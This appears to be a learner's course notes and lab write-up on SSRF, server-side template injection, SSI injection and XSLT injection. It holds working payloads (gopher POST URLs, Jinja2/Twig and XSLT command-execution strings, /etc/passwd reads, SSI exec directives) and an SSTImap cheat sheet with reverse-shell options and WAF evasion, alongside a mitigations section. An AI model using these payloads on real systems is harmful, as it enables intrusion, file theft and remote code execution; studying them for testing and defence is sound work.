
## Server-Side Request Forgery (SSRF)

[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability that allows an attacker to manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.




From here we can see that the dataserver parameter was calling an external website to extract its information, this is a clear sign of a possible SSRF vuln, we started a listener on our local machine 
and the server was able to connect back to us


## Enumerating the System


Here we enumerated internal running services and as we can see we found 3 

- 80
- 3306
- 8000



![](../../images/Pasted%20image%2020260919195057.png)


![](../../images/Pasted%20image%2020260919194919.png)


## Accessing Restricted Endpoints

We can access and enumerate the domain through the SSRF vulnerability. For instance, we can conduct a directory brute-force attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existent page:


![](../../images/Pasted%20image%2020260919201611.png)


As we can see, the web server responds with the default Apache 404 response. To also filter out any HTTP 403 responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in the default Apache error pages. Since the web application runs PHP, we will specify the `.php` extension:

```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```


![](../../images/Pasted%20image%2020260919201941.png)

we found 2 internal pages , admin and availability 


## Local File Inclusion (LFI)

As seen a few sections ago, we can manipulate the URL scheme to provoke further unexpected behavior. Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://` URL scheme. We can achieve this by supplying the URL `file:///etc/passwd`.

![](../../images/Pasted%20image%2020260919202212.png)


## The gopher Protocol


As we have seen previously, we can use SSRF to access restricted internal endpoints. However, we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme. For instance, let us consider a different version of the previous web application. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:

![](../../images/Pasted%20image%2020260919202406.png)

Assuming we want to try common weak passwords, such as `admin`, we can send the following POST request:


```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:


```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Our specified bytes are sent to the target when the web application processes this URL. Since we carefully chose the bytes to represent a valid POST request, the internal web server accepts our POST request and responds accordingly. However, since we are sending our URL within the HTTP POST parameter `dateserver`, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After URL encoding the entire gopher URL one more time, we can finally send the following request:


```
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

![](../../images/Pasted%20image%2020260919202957.png)



We can use the `gopher` protocol to interact with many internal services, not just HTTP servers. Imagine a scenario where we identify, through an SSRF vulnerability, that TCP port 25 is open on the local system. This is the standard port for SMTP servers. We can also use Gopher to interact with this internal SMTP server. However, constructing syntactically and semantically correct gopher URLs can be time-consuming and effort-intensive. Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us. The following services are supported:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

To run the tool, a valid Python 2 installation is required. Afterward, we can run the tool by executing the Python script downloaded from the GitHub repository


```
python2.7 gopherus.py
```


Let us generate a valid SMTP URL by supplying the corresponding argument. The tool asks us to input details about the email we intend to send. Afterward, we are given a valid gopher URL that we can use in our SSRF exploitation

```
python2.7 gopherus.py --exploit smtp
```




**Start — raw request (what the target must receive):**

text

POST /admin.php HTTP/1.1
Host: 10.129.201.127
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
adminpw=admin

---

**PASS 1 — encode for gopher**

Encode every special char. Key mappings:

- space → `%20`
    
- `\r\n` → `%0D%0A`
    
- `:` → `%3A`
    
- `/` → `%2F`
    
- `=` → `%3D`
    

Result (this is the "inner" payload):



`POST%20/admin.php%20HTTP%2F1.1%0D%0AHost%3A%2010.129.201.127%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aadminpw%3Dadmin`

Now **prepend** `gopher://host:port/_`:


gopher://10.129.201.127:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost%3A%2010.129.201.127%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aadminpw%3Dadmin

This is a valid, usable gopher URL. If the vulnerable param weren't itself URL-encoded on the wire, you'd stop here.

---

**PASS 2 — encode the whole gopher URL (because it lives inside `dateserver=`)**

Now encode that entire gopher URL **again**. The critical part: every existing `%` becomes `%25`.

- `%20` → `%2520`
    
- `%0D%0A` → `%250D%250A`
    
- `%3A` → `%253A`
    
- `%2F` → `%252F`
    
- `:` → `%3A`
    
- `/` → `%2F`
    

Result (this goes after `dateserver=`):


```
gopher%3A%2F%2F10.129.201.127%3A80%2F_POST%2520%2Fadmin.php%2520HTTP%252F1.1%250D%250AHost%253A%252010.129.201.127%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aadminpw%253Dadmin

---
```

**Final request:**



`POST /index.php HTTP/1.1`
`Host: 10.129.201.127`
`Content-Type: application/x-www-form-urlencoded`
`dateserver=gopher%3A%2F%2F10.129.201.127%3A80%2F_POST%2520%2Fadmin.php%2520HTTP%252F1.1%250D%250AHost%253A%252010.129.201.127%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01`

---

**Verify by decoding twice:**

Decode once → should look like a normal gopher URL:  
`gopher://10.129.201.127:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0A...`

Decode twice → should look like the raw HTTP request:  
`POST /admin.php HTTP/1.1\r\nHost: 10.129.201.127\r\n...`

If after one decode you still see `%25` anywhere → you encoded too many times. If after two decodes you still see `%20` → you didn't encode enough.
![](../../images/Pasted%20image%2020260919205519.png)



# Blind SSRF

In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called `blind` SSRF vulnerabilities because we cannot see the response.

## Identifying Blind SSRF



The sample web application behaves in the same way as in the previous section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a `netcat` listener:


```
nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```


However, if we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request. Instead, it simply lets us know that the date is unavailable. Therefore, this is a blind SSRF vulnerability:



![](../../images/Pasted%20image%2020260919205909.png)



## Exploiting Blind SSRF

Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities. However, depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web application responds with `Something went wrong!` for closed ports:

![](../../images/Pasted%20image%2020260919210031.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:

![](../../images/Pasted%20image%2020260919210038.png)

Depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. For instance, we are unable to identify the running MySQL service using this technique:

![](../../images/Pasted%20image%2020260919210122.png)


Furthermore, although we cannot read local files as before, we can still use the same technique to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports


![](../../images/Pasted%20image%2020260919210208.png)

For invalid files, the error message is different:

![](../../images/Pasted%20image%2020260919210224.png)


While we cannot use blind SSRF vulnerabilities to directly exfiltrate data, as we did in the previous sections, we can employ the discussed techniques to enumerate open ports in the local network or enumerate existing files on the filesystem. This may reveal information about the underlying system architecture that can help prepare subsequent attacks. Keep in mind that even if the web application responds with the same error message for both open and closed ports, we can still interact with the internal network, albeit blindly. Therefore, we can potentially exploit internal web applications by guessing common payloads.


![](../../images/Pasted%20image%2020260919212127.png)

here the server was giving blind responses , meaning there was a different reaction of  on a closed and open port , closed ports were giving "something went wrong! " errors so we excluded them from our FUZZ and found the open ports 

we could have also used -ac which automatically detects errors and doesn't print them



---------------
# SSTI

As the name suggests, Server-side Template Injection (SSTI) occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server may execute the code during the rendering process, allowing the attacker to take complete control of the server.


## Server-side Template Injection

As we have seen in the previous section, the rendering of templates inherently deals with dynamic values provided to the template engine during rendering. Often, these dynamic values are provided by the user. However, template engines can handle user input securely if it is provided as values to the rendering function. That is because template engines insert the values into the corresponding places in the template and do not run any code within the values. On the other hand, SSTI occurs when an attacker can control the template parameter, as template engines run the code provided in the template.


SSTI can occur when user input is inserted into the template **before** the rendering function is called on the template.


## Identifying the Template Engine


To successfully exploit an SSTI vulnerability, we first need to determine the template engine used by the web application. We can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:


![](../../images/Pasted%20image%2020260920092341.png)


Lab

Here we had to identify the template engine , by following the above diagram we injected various payloads, the `{{7*'7'}}` seemed to work and produced the result 49 which means its a Twig template 

![](../../images/Pasted%20image%2020260920093034.png)


# Exploiting SSTI - Jinja2


Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

In our payload, we can freely use any libraries that are already imported by the Python application, either directly or indirectly. Additionally, we may be able to import additional libraries through the use of the `import` statement.

## Information Disclosure

we can obtain the web application's configuration using the following SSTI payload

```
{{ config.items() }}
```


![](../../images/Pasted%20image%2020260920093533.png)


We can use the following SSTI payload to dump all available built-in functions:

```
{{ self.__init__.__globals__.__builtins__ }}
```


## Local File Inclusion (LFI)

We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`

```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```


![](../../images/Pasted%20image%2020260920093825.png)


## Remote Code Execution (RCE)


To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![](../../images/Pasted%20image%2020260920093942.png)


Exercise! 

We used command execution to obtain the flag

![](../../images/Pasted%20image%2020260920094146.png)

![](../../images/Pasted%20image%2020260920094201.png)


# Exploiting SSTI - Twig

Twig is a template engine for the PHP programming language.


In Twig, we can use the `_self` keyword to obtain a little information about the current template

```
{{ _self }}
```

![](../../images/Pasted%20image%2020260920094432.png)


## Local File Inclusion (LFI)


Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files



```
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

==DO NOT USE SPACES IT WILL BREAK THE COMMAND==

## Remote Code Execution (RCE)

To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads


```
{{ ['id'] | filter('system') }}
```



# SSTI Tools of the Trade & Preventing SSTI


# SSTImap Cheat Sheet


```
sstimap.py -u "http://target/index.php?name=*"
```

*marks the injection poiont


## Specify Injection Point

# `GET`
`sstimap.py -u "http://target/?name=*"`

# `POST`
`sstimap.py -u "http://target/" -m POST -d "name=*"`

# `Cookie`
`sstimap.py -u "http://target/" -H "Cookie: session=*"`

# `Custom header`
`sstimap.py -u "http://target/" -H "User-Agent: *"`


## Force Engine (skip fingerprinting)


```
sstimap.py -u "http://target/?name=*" -e twig
sstimap.py -u "http://target/?name=*" -e jinja2
sstimap.py -u "http://target/?name=*" -e freemarker
```


## Request Options

`-m METHOD          # GET/POST/PUT/etc`
`-d "a=1&b=*"       # POST data`
`-H "Header: val"   # custom header`
`-c "cookie=val"    # cookies`
`--proxy 127.0.0.1:8080`
`--delay 1          # delay between requests (WAF evasion)`
`--verify-ssl`


## Command Execution


```
# Single OS command
--os-cmd "id"

# Single template-language command
--eval-cmd "import os; os.popen('id').read()"

# Download file
--download /etc/passwd ./passwd.txt

# Upload file
--upload ./local.txt /remote/path
```

## Shells

# `Reverse shell (start nc -lvnp <port> first)`
`--reverse-shell <your_ip> <port>`

`# Bind shell (target opens port)`
`--bind-shell <port>`

![](../../images/Pasted%20image%2020260920102525.png)


![](../../images/Pasted%20image%2020260920102509.png)

![](../../images/Pasted%20image%2020260920102452.png)

## Interactive Mode

sstimap.py -u "http://target/?name=*" -i



**Inside interactive prompt:**

`check              # re-run detection`
`help               # list commands`
`run                # re-run scan`

`os_cmd <cmd>       # run OS command`
`os_shell           # interactive pseudo-shell`
`eval_cmd <code>    # run in template language`

`reverse_shell <ip> <port>`
`bind_shell <port>`

`download <remote> <local>`
`upload <local> <remote>`

`header "X-Foo: bar"`
`cookie "session=abc"`
`proxy "127.0.0.1:8080"`
`delay 1`
`engine twig`

`exit`



## Common Flags Summary


|Flag|Purpose|
|---|---|
|`-u`|Target URL (with `*` at injection point)|
|`-m`|HTTP method|
|`-d`|POST body|
|`-H`|Header|
|`-c`|Cookie|
|`-e`|Force engine|
|`-i`|Interactive mode|
|`--os-cmd`|Run OS command|
|`--eval-cmd`|Run template-language command|
|`--reverse-shell`|Reverse shell|
|`--bind-shell`|Bind shell|
|`--download`|Fetch file from target|
|`--upload`|Push file to target|
|`-S`|Force OS shell mode|
|`-P`|Force plugin mode|
|`--proxy`|Route through Burp|
|`--delay`|Seconds between requests|
|`--verify-ssl`|Ignore TLS errors|
|`--user-agent`|Custom UA|
|`--cookie`|Raw cookie string|


## Workflow

1. `check` → confirm injection, note engine
    
2. `os_cmd id` → confirm RCE
    
3. `os_shell` or `reverse_shell` → get stable access
    
4. `download /etc/passwd .` → loot files
    
5. `header`/`cookie`/`proxy` → adjust for auth'd routes or debugging



## Known Gotchas

- `NoneType` error on download → engine misdetected or file read blocked. Force engine with `-e`, or use `--os-cmd "cat file"`.
    
- Wrong engine guess → try `-e` with the correct one; SSTImap sometimes misidentifies.
    
- WAF blocking → add `--delay` and randomize UA.
    
- Old pip install via `apt` may be behind GitHub — clone latest for fixes.


---------------------------------------

# SSI Injection

SSI injection occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives. This scenario can occur in a variety of circumstances. For instance, when the web application contains a vulnerable file upload vulnerability that enables an attacker to upload a file containing malicious SSI directives into the web root directory. Additionally, attackers might be able to inject SSI directives if a web application writes user input to a file in the web root directory.

## SSI Syntax

`<!--#name param1="value1" param2="value2" -->`

Runs inside HTML files , usually , shtml, shtm, or whatever extension the server is configured to parse

## SSI Directives


`<!--#printenv -->                                          # dump all env vars`
`<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->         # print specific vars`
`<!--#config errmsg="Error!" -->                            # change SSI config`
`<!--#exec cmd="whoami" -->                                 # RCE`
`<!--#exec cmd="id; uname -a" -->                           # multi-command`
`<!--#include virtual="index.html" -->                      # include file (webroot only)`
`<!--#fsize file="x" -->                                    # file size`
`<!--#flastmod file="x" -->                                 # last modified`
`<!--#set var="x" value="y" -->                             # define variable`


Common `echo` vars: `DOCUMENT_NAME`, `DOCUMENT_URI`, `LAST_MODIFIED`, `DATE_LOCAL`.


## Exploitation

If we enter our name, we are redirected to `/page.shtml`, which displays some general information:

![](../../images/Pasted%20image%2020260920104858.png)


We can guess that the page supports SSI based on the file extension. If our username is inserted into the page without prior sanitization, it might be vulnerable to SSI injection. Let us confirm this by providing a username of `<!--#printenv -->`

we can execute arbitrary commands using the `exec` directive by providing the following username: `<!--#exec cmd="id" -->`

![](../../images/Pasted%20image%2020260920105201.png)

------------

# XSLT Injection

[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure



## eXtensible Stylesheet Language Transformation (XSLT)

Since XSLT operates on XML-based data, we will consider the following sample XML document to explore how XSLT operates


```
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```


XSLT can be used to define a data format that is subsequently enriched with data from the XML document. XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the `xsl`-prefix. The following are some commonly used XSL elements:

- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

For instance, a simple XSLT document used to output all fruits contained within the XML document, as well as their color, may look like this:

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all the fruits:
        <xsl:for-each select="fruit">
            <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```



As we can see, the XSLT document contains a single `<xsl:template>` XSL element that is applied to the `<fruits>` node in the XML document. The template consists of the static string `Here are all the fruits:` and a loop over all `<fruit>` nodes in the XML document. For each of these nodes, the values of the `<name>` and `<color>` nodes are printed using the `<xsl:value-of>` XSL element. Combining the sample XML document with the above XSLT data results in the following output:


`Here are all the fruits:`     
`Apple (Red)`    
`Banana (Yellow)`     
`Strawberry (Red)`

Here are some additional XSL elements that can be used to narrow down further or customize the data from an XML document:

- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the `select` argument. Additionally, a sort order may be specified in the `order` argument
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the `test` argument.

For instance, we can use these XSL elements to create a list of all fruits that are of a medium size, ordered by their color in descending order:

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all fruits of medium size ordered by their color:
        <xsl:for-each select="fruit">
            <xsl:sort select="color" order="descending" />
            <xsl:if test="size = 'Medium'">
                <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```


This results in the following data:

`Here are all fruits of medium size ordered by their color:    
 Banana (Yellow)     Apple (Red)`

XSLT can be used to generate arbitrary output strings. For instance, web applications may use it to embed data from XML documents within an HTML response.

---

## XSLT Injection

As the name suggests, XSLT injection occurs whenever user input is inserted into XSL data before the XSLT processor generates output. This enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during the output generation process.

---------

# Exploiting XSLT Injection




#### Identifying XSLT Injection



As we can see, the name we provide is reflected on the page. Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might be vulnerable to XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm this, let us try injecting a broken XML tag to provoke an error in the web application. We can achieve this by providing the username `<`


![](../../images/Pasted%20image%2020260920111305.png)


## Information Disclosure


We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements

```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```


![](../../images/Pasted%20image%2020260920111658.png)


Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`

## Local File Inclusion (LFI)

We can try using multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. Thus, our sample web application does not support this function and instead returns an error. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element

```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

Our sample web application is configured to support PHP functions. As such, the local file is displayed in the response:

![](../../images/Pasted%20image%2020260920112120.png)



## Remote Code Execution (RCE)


If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command

```
<xsl:value-of select="php:function('system','id')" />
```


# Preventing XSLT Injection

---

After discussing how to identify and exploit XSLT injection vulnerabilities in the previous sections, we will conclude this module by discussing how to prevent them.

---

## Prevention

Similar to all injection vulnerabilities discussed in this module, XSLT injection can be prevented by ensuring that user input is not inserted into XSL data before it is processed by the XSLT processor. However, if the output should reflect values provided by the user, user-provided data must be added to the XSL document before processing. In this case, it is essential to implement proper sanitization and input validation to avoid XSLT injection vulnerabilities. This may prevent attackers from injecting additional XSLT elements, but the implementation may depend on the output format.

For instance, if the XSLT processor generates an HTML response, HTML-encoding user input before inserting it into the XSL data can prevent XSLT injection vulnerabilities. As HTML-encoding converts all instances of `<` to `&lt;` and `>` to `&gt;`, an attacker should not be able to inject additional XSLT elements, thus preventing an XSLT injection vulnerability.

Additional hardening measures can mitigate the impact of potential XSLT injection vulnerabilities. These include running the XSLT processor as a low-privilege process, preventing the use of external functions by disabling PHP functions within XSLT, and keeping the XSLT library up to date.


-----------------------------------------

# SUMMARY


## SSRF (Server-Side Request Forgery)

**Plain English:** You trick the server into making an HTTP (or other) request on your behalf. Because the request comes _from_ the server, it can reach things you can't — localhost, internal IPs, cloud metadata.

**What you'd see on a site that hints at it:**  
Any feature where the server fetches a URL or talks to another system for you. Common tells:

- A "URL" or "link" field you paste into (webhooks, "import from URL", "check this link", image-from-URL)
    
- Params named `url`, `uri`, `path`, `src`, `dest`, `redirect`, `host`, `dateserver`, `webhook`, `callback`
    
- A "preview" feature that shows a thumbnail or title of a URL you give it
    
- A PDF/screenshot generator ("enter a URL, we'll render it")
    
- Anything that says "loading data from external source"
    

**Quick test:** point it at your own listener (`http://YOUR_IP:8000/x`). If your listener gets a hit, the server made the request. Then try `http://127.0.0.1/` to see if it reaches itself — that confirms internal reach.

**Why it's dangerous:** internal-only services (databases, admin panels, Redis, cloud metadata at `169.254.169.254`) become reachable. Often chains into RCE via gopher → Redis/MySQL/FastCGI.

---

## SSTI (Server-Side Template Injection)

**Plain English:** The app builds a template (Jinja2, Twig, Freemarker, etc.) using your input, and you inject template syntax that gets executed server-side. Usually escalates to RCE.

**What you'd see on a site that hints at it:**  
Places where your input is reflected back _inside a page that gets rendered dynamically_. Tells:

- A "Hello, {name}" type greeting that uses what you typed
    
- Any user input that appears in a personalized page, email template, PDF report, or preview
    
- Params like `name`, `q`, `message`, `template`, `page`, `email`, `subject`, `content`
    
- Apps built on Symfony (Twig), Flask (Jinja2), Spring (Thymeleaf/Freemarker), Rails (ERB)
    

**Quick test:** submit `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` — one of them returning `49` in the response means SSTI. Then `{{7*'7'}}` distinguishes Jinja2 (`7777777`) from Twig (`49`).

**Why it's dangerous:** direct RCE. You can call OS functions from the template language once you know the engine.

## Quick Decision Tree

1. **Is it Jinja2?** Try `{{ lipsum.__globals__['os'].popen('id').read() }}` first.
    
    - No `lipsum`? Try `config.__class__.__init__.__globals__['os'].popen('id').read()`.
        
    - No `config`? Use subclass traversal.
        
2. **Is it Twig?** Try `{{ ['id']|filter('system') }}` first.
    
    - Filter disabled? Try `_self.env` gadget if version is old.
        
    - Both blocked? Check `disable_functions` and pivot to another function that calls a binary.


## What SSTImap Automates For You

SSTImap already tries all of these. When you run `--os-cmd "id"`, it:

- Fingerprints the engine
    
- Picks the right gadget for that engine and version
    
- Injects it into the parameter
    
- Returns the output
    

That's why `os_cmd` sometimes works even when your manual payload failed — SSTImap has the full payload library for that engine, including version-specific gadgets.


---

## SSI (Server-Side Includes)

**Plain English:** Directives embedded in HTML files that the server processes before sending the page. `<!--#exec cmd="..." -->` runs a shell command.

**What you'd see on a site that hints at it:**  
This one is less about the visible site and more about the server:

- URLs ending in `.shtml`, `.shtm`, `.stm`, `.sht`
    
- Apache/IIS servers with SSI enabled — nmap's `http-ssi` NSE script reports it
    
- A file upload that accepts `.shtml` or `.html` and the server parses them
    
- Old apps (early-2000s era look) that still run on legacy Apache configs
    

**Quick test:** upload or reach a file containing `<!--#echo var="DATE_LOCAL" -->`. If the response shows the server's date/time instead of that literal text, SSI is executing.

**Why it's dangerous:** `exec` directive = straight command execution. No template tricks needed. Also useful inside SSRF/gopher chains where you POST raw bytes to Apache.

---

## XSLT Injection

**Plain English:** An app takes XML input, applies an XSL stylesheet to transform it, and lets you inject XSL elements. Some XSLT processors can read files and run system commands.

**What you'd see on a site that hints at it:**  
Features that take XML and transform or render it. Tells:

- File upload that expects `.xml` or `.xsl`/`.xslt`
    
- A feature that "converts" or "formats" XML data (reports, invoices, feeds, exports)
    
- SOAP APIs or anything returning XML that later gets styled/transformed
    
- Params like `xml`, `xsl`, `stylesheet`, `transform`, `data`, `document`
    
- A page that displays an XML document in a nice layout server-side
    

**Quick test:** submit XML containing `<xsl:value-of select="7*7"/>` in a stylesheet you control. If the output shows `49`, the processor is evaluating your XSL.

**Why it's dangerous:** `document()` reads files, `php:function()` (if enabled) calls PHP functions, and older libxslt/Saxon versions have RCE gadgets. Chains from "read /etc/passwd" to full command exec.

---

# How to Spot Which One You're Dealing With

Ask: **what is the app doing with my input?**

|Input shape|Likely vuln|
|---|---|
|A URL / hostname you supply|SSRF|
|Text that appears in a rendered page|SSTI|
|A file that gets uploaded and served|SSI (if extension is SSI-parseable)|
|XML / XSL the app transforms|XSLT injection|

If it does something with a URL → SSRF.  
If your text appears inside a personalized page → SSTI.  
If you can upload `.shtml` and it renders on visit → SSI.  
If XML gets transformed server-side → XSLT.

---

# Mitigations (all four, side by side)

The common thread: **never let user input become code or control a server-side action.**

**SSRF**

- Allowlist destinations. Do not blacklist — bypasses (decimal IPs, redirects, DNS rebinding) kill blacklists.
    
- Restrict URL schemes. Hardcode `https://` or allowlist. No `file://`, `gopher://`, `dict://`.
    
- Resolve DNS first, then check the IP against a private-range deny list. Then connect to the IP, not the hostname (prevents DNS rebinding).
    
- Disable redirects, or re-validate the destination after each hop.
    
- Network layer: egress firewall rules, block outbound to RFC1918 and `169.254.169.254`, segment internal networks.
    

**SSTI**

- Never concatenate user input into template strings. Pass user values as _context variables_ to a pre-written template.
    
- If you must template user input, use a logic-less engine (Mustache, Handlebars) or sandbox the templating engine.
    
- Encode output for context (HTML, JS, XML, URL).
    
- Keep the templating library patched — old Twig/Jinja2 versions had direct RCE gadgets.
    

**SSI**

- Disable SSI unless you specifically need it. Apache: `Options -Includes`.
    
- If you do need it, use `Options IncludesNOEXEC` — turns off the `exec` directive.
    
- Restrict SSI to trusted directories only.
    
- Prevent uploads of `.shtml` / `.shtm` / `.stm` / `.sht` — allowlist safe extensions and validate content type + magic bytes.
    
- Never allow `.htaccess` uploads that let users reconfigure `AddOutputFilter INCLUDES`.
    

**XSLT**

- Never insert user input into XSL data before processing. Pass it as a parameter via the XSLT API (`setParameter` in libxslt, etc.).
    
- Encode user input based on the output format (HTML-encode if the output is HTML).
    
- Disable external functions: turn off `php:function()` (PHP), lock down extensions in libxslt/Saxon.
    
- Disable `document()` if the app doesn't need it — this kills XSLT-based file read.
    
- Run the XSLT processor as a low-privilege user.
    
- Keep libxslt / Saxon / Xalan patched.
    

---

# The One-Line Summary For Each

- **SSRF** — user controls _where_ the server sends a request.
    
- **SSTI** — user controls _what template code_ the server executes.
    
- **SSI** — user controls _HTML embedded directives_ that the server executes.
    
- **XSLT injection** — user controls _XML transform logic_ the server executes.
    

In all four, the root cause is the same: user input reaches a server-side interpreter. Mitigation is always: don't let that happen, or if you must, encode for the context and sandbox the processor.



-----

# Final Assessment 


From looking at the site i couldn't identify anything, i looked at the source code, enumerated a bit saw nothing interesting, then i launched burp browser and started using the in built browser to collect some requests

![](../../images/Pasted%20image%2020260920120427.png)


From here , i can immediately tell that this site might be vuln to SSRF, there is a POST request can a api calling to a external website truck.api.htb to retrieve the ids of the trucks, since i am not in the same network making the webserver connect to me wont work so i tried to make it talk to it self to , from that i got a successful response

My second though was that there might be some internal endpoints so i tried using 127.0.01:80 to see how the server reacts , i didnt get a error , tried again port 81 and got 

![](../../images/Pasted%20image%2020260920120718.png)

